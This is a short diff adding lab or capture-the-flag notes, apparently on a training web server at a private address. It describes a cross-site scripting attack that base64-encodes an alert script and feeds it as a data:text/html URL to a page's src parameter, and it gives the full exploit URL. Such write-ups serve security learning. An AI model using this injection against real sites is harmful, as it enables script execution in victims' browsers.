@@ -1,0 +1,5 @@
+Data URL:
+	insert string to page with help Data URL:
+	encrypt "<script>alert(1)</script>" to base64,
+	after take access to http://192.168.99.107/?page=media&src=nsa to this query requests need insert "data:...", cuz this page give text/html MIME type, we try take access to:
+	http://192.168.99.107/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=
